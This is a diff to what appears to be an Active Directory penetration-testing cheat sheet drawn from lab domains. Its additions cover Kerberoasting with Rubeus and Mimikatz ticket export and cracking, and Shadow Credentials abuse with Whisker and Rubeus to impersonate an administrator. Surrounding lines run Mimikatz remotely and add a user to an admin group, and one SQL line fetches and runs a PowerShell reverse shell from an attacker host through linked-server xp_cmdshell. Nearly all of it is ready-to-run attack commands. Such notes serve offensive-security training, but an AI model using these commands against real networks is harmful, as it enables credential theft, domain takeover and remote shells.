@@ -599,19 +599,19 @@ Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
 Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {get-command}
 ```
 
-##### Write File using ScriptBlock
+##### Write File using `ScriptBlock`
 
 ```powershell
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
 ```
 
-##### Edit file using ScriptBlock
+##### Edit file using `ScriptBlock`
 
 ```powershell
 Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((cat "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\msfvenom.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
 ```
 
-##### Command execution using command and ScriptBlock
+##### Command execution using command and `ScriptBlock`
 
 ```powershell
 Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
@@ -620,13 +620,13 @@ Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command 
 Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami}
 ```
 
-##### File execution using ScriptBlock
+##### File execution using `ScriptBlock`
 
 ```powershell
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
 ```
 
-##### File execution using FilePath
+##### File execution using `FilePath`
 
 ```powershell
 Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
@@ -818,12 +818,61 @@ SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --Dom
 
 # VI. Domain Privilege Escalation
 
+### Kerberoast
+
+##### Methodology
+
+>   1.   Find service accounts.
+>   2.   Request for their TGS.
+>   3.   Check if kerberoastable and then get their hashes.
+>   4.   Try to crack their hashes to get the service account’s password.
+
+##### Find user accounts as Service accounts
+
+```powershell
+# AD Module
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# PowerView
+Get-DomainUser -SPN
+
+# Rubeus
+# List Kerberoast stats
+Rubeus.exe kerberoast /stats
+
+# Request TGS
+Rubeus.exe kerberoast /user:serviceaccount /simple
+
+# Look for kerberoastable accounts that only supports RC4_HMAC to avoid detections
+Rubeus.exe kerberoast /stats /rc4opsec
+Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
+
+# Kerberoast all possible accounts
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+```
+
+##### Crack ticket using `tgsrepcrack`
+
+```powershell
+# Check if the ticket has been granted
+klist.exe
+
+# Export all tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# Crack the Service account password
+python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
+'.\2-40a10000-studentuser@USSvc~serviceaccount￾US.TECHCORP.LOCAL.kirbi
+```
+
+
+
 ### Unconstrained Delegation
 
 ##### Methodology/Steps using PowerShell
 
 >   1.  For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack
->   2.  Get a Powershell session as a different user using **"Over pass the hash"** attack if required(in this case its **pwn2/appadmin**)
+>   2.  Get a Powershell session as a different user using **"Over pass the hash"** attack if required (in this case its **pwn2/appadmin**)
 >   3.  We can try searching for local admins it has access to using **Find-LocalAdminAccess -Verbose**
 >   4.  Create a **New-PSSession** attaching to the **"Unconstrained user"**
 >   5.  Enter the new session using **Enter-PSSession**
@@ -1000,7 +1049,7 @@ Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateus
 winrs -r:us-mssql cmd.exe
 ```
 
-### LAPS
+### LAPS (Local Administrator Password Solution)
 
 ##### Methodology/Steps
 
@@ -1539,6 +1588,14 @@ Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.lo
 
 ### Shadow Credentials
 
+Users and Computer shave `msDS-KeyCredentialLink` attribute that contains the raw public keys of certificate that can be used as an alternative credential.
+
+##### Pre-requisites to abuse Shadow Credentials
+
+-   AD CS (or Key Trust)
+-   Support for PKINIT and at least one DC with Windows Server 2016 or above
+-   Permissions (`GenericWrite`/`GenericAll`) to modify the `msDS-KeyCredentialLink` attribute of the target object.
+
 ##### Abusing User Object
 
 ###### 1. Enumerate the permissions
@@ -1569,6 +1626,39 @@ Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAa
 
 ```powershell
 Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
+```
+
+##### Abusing Computer Object
+
+###### 1. Enumerate the permissions
+
+```powershell
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}
+```
+
+###### 2. Add the Shadow Credentials
+
+```powershell
+SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:328... /run:cmd.exe" "exit"
+Whisker.exe add /target:us-helpdesk$
+```
+
+###### 3. Using PowerView, see if the Shadow Credential is added
+
+```powershell
+Get-DomainComputer -Identity us-helpdesk
+```
+
+###### 4. Request the TGT by leveraging the certificate
+
+```powershell
+Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0A... /password:"ViGFo..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
+```
+
+###### 5. Request and Inject the TGS by impersonating the user
+
+```powershell
+Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGk... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
 ```
 
 # IX. Cross Forest Attacks
@@ -1699,7 +1789,7 @@ ls \\euvendor-dc.euvendor.local\c$
 
 ```powershell
 # cmdlet
-Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor�net.euvendor.local -Authentication NegotiateWithImplicitCredential
+Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor\net.euvendor.local -Authentication NegotiateWithImplicitCredential
 ```
 
 ### Extras
@@ -1710,7 +1800,7 @@ Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor�net.euvendor.local 
 Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:garrison.castle.local /all /cvs"'
 ```
 
-##### Get the ForeignSecurityPrincipal
+##### Get the `ForeignSecurityPrincipal`
 
 ```powershell
 #These SIDs can access to the target domain
@@ -1862,19 +1952,19 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "p
 Also works with **Get-SQLServerLinkCrawl**
 
 ```powershell
-#View all db in an instance
+# View all db in an instance
 Get-SQLQuery -Instance <instanceName> -Query "SELECT name FROM sys.databases"
 
-#View all tables
+# View all tables
 Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES" 
 
-#View all cols in all tables in a db
+# View all cols in all tables in a db
 Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.columns"
 
-#View data in table
+# View data in table
 Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName"
 
-# manually enumerate linked servers
+# Enumerate linked servers
 select * from master..sysservers
 
 # Openquery function can be used to run queries on a linked database
@@ -1884,10 +1974,10 @@ select * from openquery("192.168.23.25",'select * from master..sysservers')
 select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
 
 # From the initial SQL server, OS commands can be executed using nested link queries
-select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/I nvoke-PowerShellTcp.ps1'''')"'')')
+select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
 
 # How to enable rpcout in a linked DB
-# first get a rev shell on the parent DB
+# First get a rev shell on the parent DB
 Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
 Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
 Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""db-sqlsrv"""
